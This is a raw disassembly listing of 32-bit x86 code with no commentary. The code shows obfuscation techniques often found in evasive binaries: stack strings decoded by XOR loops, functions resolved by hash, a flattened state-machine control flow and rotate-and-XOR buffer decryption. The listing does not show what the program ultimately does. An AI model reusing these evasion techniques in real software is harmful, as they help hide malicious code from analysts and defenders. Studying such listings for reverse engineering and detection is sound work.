  4016ba:	81 ec 60 04 00 00    	sub    $0x460,%esp
  4016c0:	e8 9b a8 01 00       	call   0x41bf60
  4016c5:	bf 08 02 00 00       	mov    $0x208,%edi
  4016ca:	31 f6                	xor    %esi,%esi
  4016cc:	8d 6c 24 50          	lea    0x50(%esp),%ebp
  4016d0:	57                   	push   %edi
  4016d1:	56                   	push   %esi
  4016d2:	55                   	push   %ebp
  4016d3:	e8 28 b6 01 00       	call   0x41cd00
  4016d8:	83 c4 0c             	add    $0xc,%esp
  4016db:	bb 04 01 00 00       	mov    $0x104,%ebx
  4016e0:	55                   	push   %ebp
  4016e1:	53                   	push   %ebx
  4016e2:	e8 7f a8 01 00       	call   0x41bf66
  4016e7:	e8 68 a8 01 00       	call   0x41bf54
  4016ec:	e8 ab a8 01 00       	call   0x41bf9c
  4016f1:	e8 76 a8 01 00       	call   0x41bf6c
  4016f6:	56                   	push   %esi
  4016f7:	e8 76 a8 01 00       	call   0x41bf72
  4016fc:	6a 01                	push   $0x1
  4016fe:	e8 8d a8 01 00       	call   0x41bf90
  401703:	8d ac 24 58 02 00 00 	lea    0x258(%esp),%ebp
  40170a:	57                   	push   %edi
  40170b:	56                   	push   %esi
  40170c:	55                   	push   %ebp
  40170d:	e8 ee b5 01 00       	call   0x41cd00
  401712:	83 c4 0c             	add    $0xc,%esp
  401715:	53                   	push   %ebx
  401716:	55                   	push   %ebp
  401717:	e8 5c a8 01 00       	call   0x41bf78
  40171c:	e8 75 a8 01 00       	call   0x41bf96
  401721:	b8 ec ff ff ff       	mov    $0xffffffec,%eax
  401726:	c7 44 24 03 38 52 50 	movl   $0x63505238,0x3(%esp)
  40172d:	63 
  40172e:	c7 44 24 07 60 6e 62 	movl   $0x74626e60,0x7(%esp)
  401735:	74 
  401736:	c7 44 24 0b 75 62 66 	movl   $0x7c666275,0xb(%esp)
  40173d:	7c 
  40173e:	c7 44 24 0f 68 0f 77 	movl   $0x70770f68,0xf(%esp)
  401745:	70 
  401746:	c7 44 24 13 79 4b 42 	movl   $0x40424b79,0x13(%esp)
  40174d:	40 
  40174e:	89 c1                	mov    %eax,%ecx
  401750:	80 c1 31             	add    $0x31,%cl
  401753:	30 4c 04 17          	xor    %cl,0x17(%esp,%eax,1)
  401757:	40                   	inc    %eax
  401758:	75 f4                	jne    0x40174e
  40175a:	0f b6 44 24 03       	movzbl 0x3(%esp),%eax
  40175f:	50                   	push   %eax
  401760:	e8 f5 a7 01 00       	call   0x41bf5a
  401765:	b8 f7 ff ff ff       	mov    $0xfffffff7,%eax
  40176a:	c7 44 24 03 81 a0 bc 	movl   $0xb0bca081,0x3(%esp)
  401771:	b0 
  401772:	c7 44 24 07 a0 b5 a3 	movl   $0x91a3b5a0,0x7(%esp)
  401779:	91 
  40177a:	c6 44 24 0b 9d       	movb   $0x9d,0xb(%esp)
  40177f:	89 c1                	mov    %eax,%ecx
  401781:	80 c1 da             	add    $0xda,%cl
  401784:	30 4c 04 0c          	xor    %cl,0xc(%esp,%eax,1)
  401788:	40                   	inc    %eax
  401789:	75 f4                	jne    0x40177f
  40178b:	0f b6 44 24 03       	movzbl 0x3(%esp),%eax
  401790:	50                   	push   %eax
  401791:	e8 c4 a7 01 00       	call   0x41bf5a
  401796:	b8 f1 ff ff ff       	mov    $0xfffffff1,%eax
  40179b:	c7 44 24 03 c5 ff fb 	movl   $0xfdfbffc5,0x3(%esp)
  4017a2:	fd 
  4017a3:	c7 44 24 07 e7 e1 f7 	movl   $0xfbf7e1e7,0x7(%esp)
  4017aa:	fb 
  4017ab:	c7 44 24 0b f4 ca ee 	movl   $0xe9eecaf4,0xb(%esp)
  4017b2:	e9 
  4017b3:	66 c7 44 24 0f f5 f3 	movw   $0xf3f5,0xf(%esp)
  4017ba:	c6 44 24 11 f9       	movb   $0xf9,0x11(%esp)
  4017bf:	89 c1                	mov    %eax,%ecx
  4017c1:	80 c1 9f             	add    $0x9f,%cl
  4017c4:	30 4c 04 12          	xor    %cl,0x12(%esp,%eax,1)
  4017c8:	40                   	inc    %eax
  4017c9:	75 f4                	jne    0x4017bf
  4017cb:	0f b6 44 24 03       	movzbl 0x3(%esp),%eax
  4017d0:	50                   	push   %eax
  4017d1:	e8 84 a7 01 00       	call   0x41bf5a
  4017d6:	b8 eb ff ff ff       	mov    $0xffffffeb,%eax
  4017db:	c7 44 24 03 ab 87 88 	movl   $0x8e8887ab,0x3(%esp)
  4017e2:	8e 
  4017e3:	c7 44 24 07 82 82 8a 	movl   $0xce8a8282,0x7(%esp)
  4017ea:	ce 
  4017eb:	c7 44 24 0b 8c 9f 9f 	movl   $0x949f9f8c,0xb(%esp)
  4017f2:	94 
  4017f3:	c7 44 24 0f 9a 93 80 	movl   $0x8480939a,0xf(%esp)
  4017fa:	84 
  4017fb:	c7 44 24 13 96 8c 90 	movl   $0x95908c96,0x13(%esp)
  401802:	95 
  401803:	c6 44 24 17 95       	movb   $0x95,0x17(%esp)
  401808:	89 c1                	mov    %eax,%ecx
  40180a:	80 c1 fc             	add    $0xfc,%cl
  40180d:	30 4c 04 18          	xor    %cl,0x18(%esp,%eax,1)
  401811:	40                   	inc    %eax
  401812:	75 f4                	jne    0x401808
  401814:	0f b6 44 24 03       	movzbl 0x3(%esp),%eax
  401819:	50                   	push   %eax
  40181a:	e8 3b a7 01 00       	call   0x41bf5a
  40181f:	b8 ed ff ff ff       	mov    $0xffffffed,%eax
  401824:	c7 44 24 03 1d 23 31 	movl   $0x2731231d,0x3(%esp)
  40182b:	27 
  40182c:	c7 44 24 07 37 23 31 	movl   $0x36312337,0x7(%esp)
  401833:	36 
  401834:	c7 44 24 0b 34 7b 3f 	movl   $0x323f7b34,0xb(%esp)
  40183b:	32 
  40183c:	c7 44 24 0f 33 2f 0c 	movl   $0x40c2f33,0xf(%esp)
  401843:	04 
  401844:	66 c7 44 24 13 16 06 	movw   $0x616,0x13(%esp)
  40184b:	c6 44 24 15 00       	movb   $0x0,0x15(%esp)
  401850:	89 c1                	mov    %eax,%ecx
  401852:	80 c1 65             	add    $0x65,%cl
  401855:	30 4c 04 16          	xor    %cl,0x16(%esp,%eax,1)
  401859:	40                   	inc    %eax
  40185a:	75 f4                	jne    0x401850
  40185c:	0f b6 44 24 03       	movzbl 0x3(%esp),%eax
  401861:	50                   	push   %eax
  401862:	e8 f3 a6 01 00       	call   0x41bf5a
  401867:	b8 b3 ff ff ff       	mov    $0xffffffb3,%eax
  40186c:	c7 44 24 03 8b 88 88 	movl   $0x9188888b,0x3(%esp)
  401873:	91 
  401874:	c7 44 24 07 c3 85 95 	movl   $0x969585c3,0x7(%esp)
  40187b:	96 
  40187c:	c7 44 24 0b 8b 81 8a 	movl   $0x8b8a818b,0xb(%esp)
  401883:	8b 
  401884:	c7 44 24 0f 9f 85 82 	movl   $0x8082859f,0xf(%esp)
  40188b:	80 
  40188c:	c7 44 24 13 cf 98 90 	movl   $0x819098cf,0x13(%esp)
  401893:	81 
  401894:	c7 44 24 17 d3 86 90 	movl   $0x879086d3,0x17(%esp)
  40189b:	87 
  40189c:	c7 44 24 1b 82 9d 8a 	movl   $0x8e8a9d82,0x1b(%esp)
  4018a3:	8e 
  4018a4:	c7 44 24 1f 9e 98 dd 	movl   $0x8add989e,0x1f(%esp)
  4018ab:	8a 
  4018ac:	c7 44 24 23 97 65 21 	movl   $0x50216597,0x23(%esp)
  4018b3:	50 
  4018b4:	c7 44 24 27 76 6a 71 	movl   $0x6f716a76,0x27(%esp)
  4018bb:	6f 
  4018bc:	c7 44 24 2b 6a 6d 29 	movl   $0x7e296d6a,0x2b(%esp)
  4018c3:	7e 
  4018c4:	c7 44 24 2f 64 2c 79 	movl   $0x6b792c64,0x2f(%esp)
  4018cb:	6b 
  4018cc:	c7 44 24 33 7d 7d 78 	movl   $0x7c787d7d,0x33(%esp)
  4018d3:	7c 
  4018d4:	c7 44 24 37 72 60 70 	movl   $0x36706072,0x37(%esp)
  4018db:	36 
  4018dc:	c7 44 24 3b 7e 6c 39 	movl   $0x73396c7e,0x3b(%esp)
  4018e3:	73 
  4018e4:	c7 44 24 3f 75 3c 7c 	movl   $0x707c3c75,0x3f(%esp)
  4018eb:	70 
  4018ec:	c7 44 24 43 3f 55 4f 	movl   $0x574f553f,0x43(%esp)
  4018f3:	57 
  4018f4:	c7 44 24 47 50 51 44 	movl   $0x4a445150,0x47(%esp)
  4018fb:	4a 
  4018fc:	c7 44 24 4b 07 5f 48 	movl   $0x53485f07,0x4b(%esp)
  401903:	53 
  401904:	c6 44 24 4f 05       	movb   $0x5,0x4f(%esp)
  401909:	89 c1                	mov    %eax,%ecx
  40190b:	80 c1 2c             	add    $0x2c,%cl
  40190e:	30 4c 04 50          	xor    %cl,0x50(%esp,%eax,1)
  401912:	40                   	inc    %eax
  401913:	75 f4                	jne    0x401909
  401915:	0f b6 44 24 03       	movzbl 0x3(%esp),%eax
  40191a:	50                   	push   %eax
  40191b:	e8 3a a6 01 00       	call   0x41bf5a
  401920:	b8 cf ff ff ff       	mov    $0xffffffcf,%eax
  401925:	c7 44 24 03 6a 57 25 	movl   $0x6125576a,0x3(%esp)
  40192c:	61 
  40192d:	c7 44 24 07 32 31 2b 	movl   $0x262b3132,0x7(%esp)
  401934:	26 
  401935:	c7 44 24 0b 23 23 3d 	movl   $0x3b3d2323,0xb(%esp)
  40193c:	3b 
  40193d:	c7 44 24 0f 2f 6b 29 	movl   $0x23296b2f,0xf(%esp)
  401944:	23 
  401945:	c7 44 24 13 3a 3d 29 	movl   $0x71293d3a,0x13(%esp)
  40194c:	71 
  40194d:	c7 44 24 17 22 3c 3d 	movl   $0x3b3d3c22,0x17(%esp)
  401954:	3b 
  401955:	c7 44 24 1b 22 77 7d 	movl   $0x2a7d7722,0x1b(%esp)
  40195c:	2a 
  40195d:	c7 44 24 1f 7a 38 33 	movl   $0x2833387a,0x1f(%esp)
  401964:	28 
  401965:	c7 44 24 23 32 3b 40 	movl   $0xf403b32,0x23(%esp)
  40196c:	0f 
  40196d:	c7 44 24 27 0d 17 44 	movl   $0x744170d,0x27(%esp)
  401974:	07 
  401975:	c7 44 24 2b 03 47 04 	movl   $0x6044703,0x2b(%esp)
  40197c:	06 
  40197d:	c7 44 24 2f 09 0a 18 	movl   $0x8180a09,0x2f(%esp)
  401984:	08 
  401985:	c6 44 24 33 0a       	movb   $0xa,0x33(%esp)
  40198a:	89 c1                	mov    %eax,%ecx
  40198c:	80 c1 6f             	add    $0x6f,%cl
  40198f:	30 4c 04 34          	xor    %cl,0x34(%esp,%eax,1)
  401993:	40                   	inc    %eax
  401994:	75 f4                	jne    0x40198a
  401996:	0f b6 44 24 03       	movzbl 0x3(%esp),%eax
  40199b:	50                   	push   %eax
  40199c:	e8 b9 a5 01 00       	call   0x41bf5a
  4019a1:	e8 a2 a5 01 00       	call   0x41bf48
  4019a6:	50                   	push   %eax
  4019a7:	e8 ae a5 01 00       	call   0x41bf5a
  4019ac:	81 c4 60 04 00 00    	add    $0x460,%esp
  4019b2:	5e                   	pop    %esi
  4019b3:	5f                   	pop    %edi
  4019b4:	5b                   	pop    %ebx
  4019b5:	5d                   	pop    %ebp
  4019b6:	c3                   	ret
  4019b7:	55                   	push   %ebp
  4019b8:	89 e5                	mov    %esp,%ebp
  4019ba:	53                   	push   %ebx
  4019bb:	57                   	push   %edi
  4019bc:	56                   	push   %esi
  4019bd:	83 e4 f0             	and    $0xfffffff0,%esp
  4019c0:	81 ec 50 09 00 00    	sub    $0x950,%esp
  4019c6:	89 e6                	mov    %esp,%esi
  4019c8:	89 ae 38 09 00 00    	mov    %ebp,0x938(%esi)
  4019ce:	8d 86 40 09 00 00    	lea    0x940(%esi),%eax
  4019d4:	89 60 fc             	mov    %esp,-0x4(%eax)
  4019d7:	c7 40 08 ff ff ff ff 	movl   $0xffffffff,0x8(%eax)
  4019de:	c7 40 04 10 45 40 00 	movl   $0x404510,0x4(%eax)
  4019e5:	64 8b 0d 00 00 00 00 	mov    %fs:0x0,%ecx
  4019ec:	89 08                	mov    %ecx,(%eax)
  4019ee:	31 c9                	xor    %ecx,%ecx
  4019f0:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4019f6:	89 4e 60             	mov    %ecx,0x60(%esi)
  4019f9:	c7 46 64 01 00 00 00 	movl   $0x1,0x64(%esi)
  401a00:	89 4e 68             	mov    %ecx,0x68(%esi)
  401a03:	89 8e a4 00 00 00    	mov    %ecx,0xa4(%esi)
  401a09:	89 48 08             	mov    %ecx,0x8(%eax)
  401a0c:	e8 2f bd 00 00       	call   0x40d740
  401a11:	8d 8e e0 00 00 00    	lea    0xe0(%esi),%ecx
  401a17:	89 01                	mov    %eax,(%ecx)
  401a19:	89 51 04             	mov    %edx,0x4(%ecx)
  401a1c:	8d 86 e0 04 00 00    	lea    0x4e0(%esi),%eax
  401a22:	68 de b1 9d 01       	push   $0x19db1de
  401a27:	68 00 80 3e d5       	push   $0xd53e8000
  401a2c:	51                   	push   %ecx
  401a2d:	50                   	push   %eax
  401a2e:	e8 9d bc 00 00       	call   0x40d6d0
  401a33:	83 c4 10             	add    $0x10,%esp
  401a36:	f6 86 e0 04 00 00 01 	testb  $0x1,0x4e0(%esi)
  401a3d:	74 0a                	je     0x401a49
  401a3f:	31 c9                	xor    %ecx,%ecx
  401a41:	31 c0                	xor    %eax,%eax
  401a43:	31 d2                	xor    %edx,%edx
  401a45:	31 ff                	xor    %edi,%edi
  401a47:	eb 31                	jmp    0x401a7a
  401a49:	b8 00 ca 9a 3b       	mov    $0x3b9aca00,%eax
  401a4e:	f7 a6 e8 04 00 00    	mull   0x4e8(%esi)
  401a54:	89 c1                	mov    %eax,%ecx
  401a56:	b8 00 ca 9a 3b       	mov    $0x3b9aca00,%eax
  401a5b:	89 d7                	mov    %edx,%edi
  401a5d:	f7 a6 ec 04 00 00    	mull   0x4ec(%esi)
  401a63:	01 f8                	add    %edi,%eax
  401a65:	83 d2 00             	adc    $0x0,%edx
  401a68:	03 8e f0 04 00 00    	add    0x4f0(%esi),%ecx
  401a6e:	83 d0 00             	adc    $0x0,%eax
  401a71:	83 d2 00             	adc    $0x0,%edx
  401a74:	0f 92 c3             	setb   %bl
  401a77:	0f b6 fb             	movzbl %bl,%edi
  401a7a:	8d 9e e0 04 00 00    	lea    0x4e0(%esi),%ebx
  401a80:	89 7b 0c             	mov    %edi,0xc(%ebx)
  401a83:	89 53 08             	mov    %edx,0x8(%ebx)
  401a86:	89 43 04             	mov    %eax,0x4(%ebx)
  401a89:	89 0b                	mov    %ecx,(%ebx)
  401a8b:	89 df                	mov    %ebx,%edi
  401a8d:	8b 03                	mov    (%ebx),%eax
  401a8f:	8b 4b 04             	mov    0x4(%ebx),%ecx
  401a92:	0b 4b 0c             	or     0xc(%ebx),%ecx
  401a95:	0b 43 08             	or     0x8(%ebx),%eax
  401a98:	09 c8                	or     %ecx,%eax
  401a9a:	75 0d                	jne    0x401aa9
  401a9c:	e8 32 f7 ff ff       	call   0x4011d3
  401aa1:	8d 8e e0 04 00 00    	lea    0x4e0(%esi),%ecx
  401aa7:	89 01                	mov    %eax,(%ecx)
  401aa9:	8d 8e e0 04 00 00    	lea    0x4e0(%esi),%ecx
  401aaf:	c7 01 33 40 00 00    	movl   $0x4033,(%ecx)
  401ab5:	8b 01                	mov    (%ecx),%eax
  401ab7:	c7 01 01 00 00 00    	movl   $0x1,(%ecx)
  401abd:	0f af 01             	imul   (%ecx),%eax
  401ac0:	c7 01 bb 5c ee 70    	movl   $0x70ee5cbb,(%ecx)
  401ac6:	8d 8e e0 04 00 00    	lea    0x4e0(%esi),%ecx
  401acc:	8b 11                	mov    (%ecx),%edx
  401ace:	c7 01 00 00 00 00    	movl   $0x0,(%ecx)
  401ad4:	8d 8e e0 04 00 00    	lea    0x4e0(%esi),%ecx
  401ada:	c7 86 a0 00 00 00 00 	movl   $0x0,0xa0(%esi)
  401ae1:	00 00 00 
  401ae4:	c7 46 08 00 00 00 00 	movl   $0x0,0x8(%esi)
  401aeb:	0f af 11             	imul   (%ecx),%edx
  401aee:	b9 7f 42 00 00       	mov    $0x427f,%ecx
  401af3:	01 c2                	add    %eax,%edx
  401af5:	89 96 b8 00 00 00    	mov    %edx,0xb8(%esi)
  401afb:	8b 86 a0 00 00 00    	mov    0xa0(%esi),%eax
  401b01:	40                   	inc    %eax
  401b02:	83 f8 12             	cmp    $0x12,%eax
  401b05:	89 86 a0 00 00 00    	mov    %eax,0xa0(%esi)
  401b0b:	0f 87 6f 1a 00 00    	ja     0x403580
  401b11:	33 8e b8 00 00 00    	xor    0xb8(%esi),%ecx
  401b17:	81 f9 25 02 00 00    	cmp    $0x225,%ecx
  401b1d:	0f 8e 10 02 00 00    	jle    0x401d33
  401b23:	81 f9 5e 02 00 00    	cmp    $0x25e,%ecx
  401b29:	8d be e0 00 00 00    	lea    0xe0(%esi),%edi
  401b2f:	0f 8f 30 02 00 00    	jg     0x401d65
  401b35:	81 f9 26 02 00 00    	cmp    $0x226,%ecx
  401b3b:	0f 84 6b 05 00 00    	je     0x4020ac
  401b41:	81 f9 31 02 00 00    	cmp    $0x231,%ecx
  401b47:	0f 84 25 05 00 00    	je     0x402072
  401b4d:	81 f9 4c 02 00 00    	cmp    $0x24c,%ecx
  401b53:	0f 85 27 1a 00 00    	jne    0x403580
  401b59:	31 ff                	xor    %edi,%edi
  401b5b:	8d 86 bc 00 00 00    	lea    0xbc(%esi),%eax
  401b61:	89 be bc 00 00 00    	mov    %edi,0xbc(%esi)
  401b67:	89 be c0 00 00 00    	mov    %edi,0xc0(%esi)
  401b6d:	50                   	push   %eax
  401b6e:	e8 0b a4 01 00       	call   0x41bf7e
  401b73:	ff b6 bc 00 00 00    	push   0xbc(%esi)
  401b79:	e8 dc a3 01 00       	call   0x41bf5a
  401b7e:	68 86 eb 00 00       	push   $0xeb86
  401b83:	e8 d2 a3 01 00       	call   0x41bf5a
  401b88:	89 be 48 09 00 00    	mov    %edi,0x948(%esi)
  401b8e:	6a 0a                	push   $0xa
  401b90:	68 cb da 42 00       	push   $0x42dacb
  401b95:	e8 66 f4 ff ff       	call   0x401000
  401b9a:	83 c4 08             	add    $0x8,%esp
  401b9d:	b9 67 4c f9 fb       	mov    $0xfbf94c67,%ecx
  401ba2:	ba e0 3e 9e 01       	mov    $0x19e3ee0,%edx
  401ba7:	e8 63 f7 ff ff       	call   0x40130f
  401bac:	89 46 04             	mov    %eax,0x4(%esi)
  401baf:	b9 67 4c f9 fb       	mov    $0xfbf94c67,%ecx
  401bb4:	ba 57 7d 92 d0       	mov    $0xd0927d57,%edx
  401bb9:	e8 51 f7 ff ff       	call   0x40130f
  401bbe:	8b 7e 04             	mov    0x4(%esi),%edi
  401bc1:	85 ff                	test   %edi,%edi
  401bc3:	0f 94 c2             	sete   %dl
  401bc6:	85 c0                	test   %eax,%eax
  401bc8:	0f 94 c1             	sete   %cl
  401bcb:	08 d1                	or     %dl,%cl
  401bcd:	0f 85 18 01 00 00    	jne    0x401ceb
  401bd3:	89 46 28             	mov    %eax,0x28(%esi)
  401bd6:	b8 00 04 00 00       	mov    $0x400,%eax
  401bdb:	50                   	push   %eax
  401bdc:	31 c0                	xor    %eax,%eax
  401bde:	50                   	push   %eax
  401bdf:	8d 9e e0 00 00 00    	lea    0xe0(%esi),%ebx
  401be5:	53                   	push   %ebx
  401be6:	e8 15 b1 01 00       	call   0x41cd00
  401beb:	83 c4 0c             	add    $0xc,%esp
  401bee:	b8 00 04 00 00       	mov    $0x400,%eax
  401bf3:	50                   	push   %eax
  401bf4:	53                   	push   %ebx
  401bf5:	31 c0                	xor    %eax,%eax
  401bf7:	50                   	push   %eax
  401bf8:	ff d7                	call   *%edi
  401bfa:	89 c3                	mov    %eax,%ebx
  401bfc:	05 04 fc ff ff       	add    $0xfffffc04,%eax
  401c01:	3d 05 fc ff ff       	cmp    $0xfffffc05,%eax
  401c06:	0f 82 df 00 00 00    	jb     0x401ceb
  401c0c:	e8 90 35 00 00       	call   0x4051a1
  401c11:	6a 01                	push   $0x1
  401c13:	6a 11                	push   $0x11
  401c15:	e8 52 4c 00 00       	call   0x40686c
  401c1a:	83 c4 08             	add    $0x8,%esp
  401c1d:	85 c0                	test   %eax,%eax
  401c1f:	0f 84 c2 19 00 00    	je     0x4035e7
  401c25:	c7 00 d5 c4 aa 31    	movl   $0x31aac4d5,(%eax)
  401c2b:	c7 40 04 f4 5b ac fb 	movl   $0xfbac5bf4,0x4(%eax)
  401c32:	c7 40 08 2f 65 72 09 	movl   $0x972652f,0x8(%eax)
  401c39:	c7 40 0c ec 61 cd 4b 	movl   $0x4bcd61ec,0xc(%eax)
  401c40:	89 c7                	mov    %eax,%edi
  401c42:	c6 40 10 04          	movb   $0x4,0x10(%eax)
  401c46:	31 c0                	xor    %eax,%eax
  401c48:	c7 86 e0 04 00 00 80 	movl   $0x483ac280,0x4e0(%esi)
  401c4f:	c2 3a 48 
  401c52:	c7 86 e4 04 00 00 fb 	movl   $0x1bdc45fb,0x4e4(%esi)
  401c59:	45 dc 1b 
  401c5c:	8a 0c 07             	mov    (%edi,%eax,1),%cl
  401c5f:	89 c2                	mov    %eax,%edx
  401c61:	83 e2 07             	and    $0x7,%edx
  401c64:	c0 c1 05             	rol    $0x5,%cl
  401c67:	32 8c 16 e0 04 00 00 	xor    0x4e0(%esi,%edx,1),%cl
  401c6e:	88 0c 07             	mov    %cl,(%edi,%eax,1)
  401c71:	40                   	inc    %eax
  401c72:	83 f8 11             	cmp    $0x11,%eax
  401c75:	75 e5                	jne    0x401c5c
  401c77:	b8 11 00 00 00       	mov    $0x11,%eax
  401c7c:	89 46 38             	mov    %eax,0x38(%esi)
  401c7f:	89 7e 3c             	mov    %edi,0x3c(%esi)
  401c82:	89 46 40             	mov    %eax,0x40(%esi)
  401c85:	68 4c 04 00 00       	push   $0x44c
  401c8a:	6a 00                	push   $0x0
  401c8c:	8d 86 e0 04 00 00    	lea    0x4e0(%esi),%eax
  401c92:	50                   	push   %eax
  401c93:	e8 68 b0 01 00       	call   0x41cd00
  401c98:	83 c4 0c             	add    $0xc,%esp
  401c9b:	31 c0                	xor    %eax,%eax
  401c9d:	8a 8c 06 e0 00 00 00 	mov    0xe0(%esi,%eax,1),%cl
  401ca4:	88 8c 06 e0 04 00 00 	mov    %cl,0x4e0(%esi,%eax,1)
  401cab:	40                   	inc    %eax
  401cac:	39 c3                	cmp    %eax,%ebx
  401cae:	75 ed                	jne    0x401c9d
  401cb0:	b8 11 00 00 00       	mov    $0x11,%eax
  401cb5:	81 fb 4c 04 00 00    	cmp    $0x44c,%ebx
  401cbb:	0f 84 7c 19 00 00    	je     0x40363d
  401cc1:	8a 0f                	mov    (%edi),%cl
  401cc3:	47                   	inc    %edi
  401cc4:	88 8c 1e e0 04 00 00 	mov    %cl,0x4e0(%esi,%ebx,1)
  401ccb:	43                   	inc    %ebx
  401ccc:	48                   	dec    %eax
  401ccd:	75 e6                	jne    0x401cb5
  401ccf:	8d 86 e0 04 00 00    	lea    0x4e0(%esi),%eax
  401cd5:	50                   	push   %eax
  401cd6:	ff 56 28             	call   *0x28(%esi)
  401cd9:	8d 4e 38             	lea    0x38(%esi),%ecx
  401cdc:	c7 86 48 09 00 00 00 	movl   $0x0,0x948(%esi)
  401ce3:	00 00 00 
  401ce6:	e8 12 26 00 00       	call   0x4042fd
  401ceb:	c7 86 94 00 00 00 00 	movl   $0x0,0x94(%esi)
  401cf2:	00 00 00 
  401cf5:	e8 8a a2 01 00       	call   0x41bf84
  401cfa:	8d 8e 94 00 00 00    	lea    0x94(%esi),%ecx
  401d00:	51                   	push   %ecx
  401d01:	6a 08                	push   $0x8
  401d03:	50                   	push   %eax
  401d04:	e8 27 a2 01 00       	call   0x41bf30
  401d09:	85 c0                	test   %eax,%eax
  401d0b:	74 12                	je     0x401d1f
  401d0d:	8b 86 94 00 00 00    	mov    0x94(%esi),%eax
  401d13:	8d 48 01             	lea    0x1(%eax),%ecx
  401d16:	83 f9 02             	cmp    $0x2,%ecx
  401d19:	0f 83 65 07 00 00    	jae    0x402484
  401d1f:	e8 92 f9 ff ff       	call   0x4016b6
  401d24:	e8 78 f8 ff ff       	call   0x4015a1
  401d29:	b9 15 42 00 00       	mov    $0x4215,%ecx
  401d2e:	e9 c8 fd ff ff       	jmp    0x401afb
  401d33:	81 f9 f5 01 00 00    	cmp    $0x1f5,%ecx
  401d39:	7e 53                	jle    0x401d8e
  401d3b:	81 f9 f6 01 00 00    	cmp    $0x1f6,%ecx
  401d41:	74 68                	je     0x401dab
  401d43:	81 f9 02 02 00 00    	cmp    $0x202,%ecx
  401d49:	0f 84 f4 06 00 00    	je     0x402443
  401d4f:	81 f9 18 02 00 00    	cmp    $0x218,%ecx
  401d55:	b9 31 42 00 00       	mov    $0x4231,%ecx
  401d5a:	0f 84 9b fd ff ff    	je     0x401afb
  401d60:	e9 1b 18 00 00       	jmp    0x403580
  401d65:	81 f9 5f 02 00 00    	cmp    $0x25f,%ecx
  401d6b:	0f 84 9c 04 00 00    	je     0x40220d
  401d71:	81 f9 80 02 00 00    	cmp    $0x280,%ecx
  401d77:	0f 84 c6 06 00 00    	je     0x402443
  401d7d:	81 f9 6b 02 00 00    	cmp    $0x26b,%ecx
  401d83:	0f 85 f7 17 00 00    	jne    0x403580
  401d89:	e9 b5 06 00 00       	jmp    0x402443
  401d8e:	81 f9 cd 01 00 00    	cmp    $0x1cd,%ecx
  401d94:	0f 84 a9 06 00 00    	je     0x402443
  401d9a:	81 f9 e1 01 00 00    	cmp    $0x1e1,%ecx
  401da0:	0f 85 da 17 00 00    	jne    0x403580
  401da6:	e9 98 06 00 00       	jmp    0x402443
  401dab:	c7 86 48 09 00 00 00 	movl   $0x0,0x948(%esi)
  401db2:	00 00 00 
  401db5:	6a 10                	push   $0x10
  401db7:	68 ec d9 42 00       	push   $0x42d9ec
  401dbc:	e8 3f f2 ff ff       	call   0x401000
  401dc1:	83 c4 08             	add    $0x8,%esp
  401dc4:	6a 10                	push   $0x10
  401dc6:	68 fc d9 42 00       	push   $0x42d9fc
  401dcb:	e8 30 f2 ff ff       	call   0x401000
  401dd0:	83 c4 08             	add    $0x8,%esp
  401dd3:	b8 6b 92 26 18       	mov    $0x1826926b,%eax
  401dd8:	b9 5e f1 c1 97       	mov    $0x97c1f15e,%ecx
  401ddd:	ba 5e 01 00 00       	mov    $0x15e,%edx
  401de2:	69 c9 2f eb d4 27    	imul   $0x27d4eb2f,%ecx,%ecx
  401de8:	c1 c1 08             	rol    $0x8,%ecx
  401deb:	01 c8                	add    %ecx,%eax
  401ded:	c1 c0 15             	rol    $0x15,%eax
  401df0:	4a                   	dec    %edx
  401df1:	75 ef                	jne    0x401de2
  401df3:	89 8e e0 04 00 00    	mov    %ecx,0x4e0(%esi)
  401df9:	89 86 e4 04 00 00    	mov    %eax,0x4e4(%esi)
  401dff:	89 c8                	mov    %ecx,%eax
  401e01:	ba 5d 41 4c ae       	mov    $0xae4c415d,%edx
  401e06:	f7 e2                	mul    %edx
  401e08:	c1 ea 07             	shr    $0x7,%edx
  401e0b:	69 c2 bc 00 00 00    	imul   $0xbc,%edx,%eax
  401e11:	29 c1                	sub    %eax,%ecx
  401e13:	8d 86 e0 04 00 00    	lea    0x4e0(%esi),%eax
  401e19:	69 c1 40 42 0f 00    	imul   $0xf4240,%ecx,%eax
  401e1f:	31 c9                	xor    %ecx,%ecx
  401e21:	05 40 c9 a2 03       	add    $0x3a2c940,%eax
  401e26:	89 8e 48 09 00 00    	mov    %ecx,0x948(%esi)
  401e2c:	50                   	push   %eax
  401e2d:	51                   	push   %ecx
  401e2e:	51                   	push   %ecx
  401e2f:	e8 ac bb 00 00       	call   0x40d9e0
  401e34:	83 c4 0c             	add    $0xc,%esp
  401e37:	6a 0f                	push   $0xf
  401e39:	68 0c da 42 00       	push   $0x42da0c
  401e3e:	e8 bd f1 ff ff       	call   0x401000
  401e43:	83 c4 08             	add    $0x8,%esp
  401e46:	8b 46 08             	mov    0x8(%esi),%eax
  401e49:	05 10 43 c5 00       	add    $0xc54310,%eax
  401e4e:	89 46 04             	mov    %eax,0x4(%esi)
  401e51:	89 86 80 00 00 00    	mov    %eax,0x80(%esi)
  401e57:	6a 0f                	push   $0xf
  401e59:	68 1b da 42 00       	push   $0x42da1b
  401e5e:	e8 9d f1 ff ff       	call   0x401000
  401e63:	83 c4 08             	add    $0x8,%esp
  401e66:	8d 86 a4 00 00 00    	lea    0xa4(%esi),%eax
  401e6c:	8d 8e 80 00 00 00    	lea    0x80(%esi),%ecx
  401e72:	ba 02 00 00 00       	mov    $0x2,%edx
  401e77:	c7 86 e0 04 00 00 48 	movl   $0x42da48,0x4e0(%esi)
  401e7e:	da 42 00 
  401e81:	89 86 e0 00 00 00    	mov    %eax,0xe0(%esi)
  401e87:	b8 e0 94 41 00       	mov    $0x4194e0,%eax
  401e8c:	89 96 e4 04 00 00    	mov    %edx,0x4e4(%esi)
  401e92:	89 86 e4 00 00 00    	mov    %eax,0xe4(%esi)
  401e98:	89 8e e8 00 00 00    	mov    %ecx,0xe8(%esi)
  401e9e:	89 86 ec 00 00 00    	mov    %eax,0xec(%esi)
  401ea4:	8d 86 e0 00 00 00    	lea    0xe0(%esi),%eax
  401eaa:	89 86 e8 04 00 00    	mov    %eax,0x4e8(%esi)
  401eb0:	8d 86 e0 04 00 00    	lea    0x4e0(%esi),%eax
  401eb6:	89 96 ec 04 00 00    	mov    %edx,0x4ec(%esi)
  401ebc:	c7 86 f0 04 00 00 00 	movl   $0x0,0x4f0(%esi)
  401ec3:	00 00 00 
  401ec6:	50                   	push   %eax
  401ec7:	8d 46 38             	lea    0x38(%esi),%eax
